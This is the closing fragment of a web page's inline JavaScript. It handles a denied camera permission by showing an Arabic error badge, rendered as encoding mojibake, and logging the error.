Â Â Â Â Â Â Â  });

Â Â Â Â Â  } catch (err) {
Â Â Â Â Â Â Â  const captureBadge = document.getElementById('captureBadge');
Â Â Â Â Â Â Â  captureBadge.textContent = 'âŒ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø±ÙÙˆØ¶';
Â Â Â Â Â Â Â  captureBadge.style.background = 'rgba(160,40,40,0.9)';
Â Â Â Â Â Â Â  console.error('Camera error', err);
Â Â Â Â Â  }
Â Â Â  })();
Â  }
</script>
</body>
Â  </html>


